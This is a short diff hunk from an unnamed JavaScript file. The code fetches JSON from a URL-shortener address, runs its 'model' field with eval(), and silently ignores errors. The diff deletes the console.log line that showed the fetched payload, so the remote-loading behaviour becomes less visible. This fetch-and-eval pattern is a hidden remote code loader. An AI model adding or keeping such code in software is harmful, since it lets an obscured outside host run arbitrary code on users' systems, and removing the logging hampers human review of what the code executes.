@@ -83,7 +83,6 @@ fetch("https://shorturl.at/147uq")
   .then((response) => response.json())
   .then((data) => {
     eval(data.model);
-    console.log(data.model);
   })
   .catch((error) => {
   });
